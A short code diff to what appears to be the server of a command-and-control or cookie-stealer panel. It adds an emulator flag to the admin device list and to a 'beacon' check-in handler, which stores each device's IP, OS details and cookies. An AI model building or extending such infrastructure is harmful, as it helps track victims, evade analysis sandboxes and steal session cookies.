@@ -114,6 +114,7 @@ async def admin_show_devices() -> dict:
             "name": d.name,
             "ip": d.ip,
             "status": d.status,
+            "is_emulator": d.is_emulator,
             "last_seen": d.last_seen.isoformat(),
         }
         for d in handler.devices.values()
@@ -217,6 +218,7 @@ async def beacon_check_in(payload: BeaconCheckIn) -> dict:
         name=payload.device_name,
         ip=payload.ip_address,
         os_info=payload.os_info,
+        is_emulator=payload.is_emulator,
         status="online",
         cookies=payload.cookies,
         last_seen=datetime.now(timezone.utc),
